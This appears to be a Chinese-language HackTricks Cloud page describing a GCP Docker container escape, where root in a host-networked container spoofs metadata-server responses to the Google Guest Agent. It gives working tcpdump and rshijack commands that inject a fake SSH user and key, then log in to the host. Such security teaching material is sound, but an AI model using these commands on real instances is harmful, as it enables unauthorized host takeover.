# GCP - 网络 Docker 逃逸

{% hint style="success" %}
学习并练习 AWS 黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习 GCP 黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## 初始状态

在指定了这种技术的两篇文章中，攻击者成功在由 GCP 管理的 Docker 容器内获得了 **root** 访问权限，并具有对主机网络的访问权限（以及 **`CAP_NET_ADMIN`** 和 **`CAP_NET_RAW`** 的功能）。

## 攻击解释

在 Google Compute Engine 实例上，定期检查网络流量会显示大量对 `169.254.169.254` 上的 **明文 HTTP 请求**，这是元数据实例。[**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent) 是一个开源服务，经常发出这样的请求。

该代理旨在**监视元数据的更改**。值得注意的是，元数据包括一个 **SSH 公钥字段**。当新的公共 SSH 密钥添加到元数据中时，代理会自动在 `.authorized_key` 文件中**授权**它。如果需要，它还可以**创建一个新用户**并将其添加到 **sudoers**。

代理通过发送请求来**递归检索所有元数据值**（`GET /computeMetadata/v1/?recursive=true`）来监视更改。此请求旨在促使元数据服务器仅在自上次检索以来元数据发生任何更改时发送响应，由 Etag（`wait_for_change=true&last_etag=`）标识。此外，还包括一个 **超时** 参数（`timeout_sec=`）。如果在指定的超时时间内没有发生更改，服务器将以**未更改的值**响应。

这个过程允许 **IMDS**（实例元数据服务）在**60秒**后响应，如果没有发生配置更改，就会为向客户代理注入一个**伪造的配置响应**创造一个潜在的窗口。

攻击者可以利用这一点，执行**中间人攻击（MitM 攻击）**，欺骗 IMDS 服务器的响应，并**插入一个新的公钥**。这可能会导致未经授权的 SSH 访问主机。

### 逃逸技术

虽然 ARP 欺骗在 Google Compute Engine 网络上无效，但由 [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html) 开发的 [**rshijack 的修改版本**](https://github.com/ezequielpereira/rshijack) 可用于在通信中进行数据包注入以注入 SSH 用户。

这个版本的 rshijack 允许将 ACK 和 SEQ 数字作为命令行参数输入，从而在真实的 Metadata 服务器响应之前伪造响应。此外，使用一个[**小型 Shell 脚本**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) 来返回一个**特制的有效负载**。这个有效负载触发 Google Guest Agent **创建一个名为 `wouter` 的用户**，并在 `.authorized_keys` 文件中指定公钥。

该脚本使用相同的 ETag 来防止 Metadata 服务器立即通知 Google Guest Agent 不同的元数据值，从而延迟响应。

要执行欺骗，需要以下步骤：

1. 使用 **tcpdump** **监视对 Metadata 服务器的请求**：
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
寻找类似以下内容的行：
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
2. 使用正确的ETAG向rshijack发送虚假元数据数据：
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
这一步授权公钥，启用与相应私钥的SSH连接。


## 参考

* [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
* [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{% hint style="success" %}
学习并练习AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
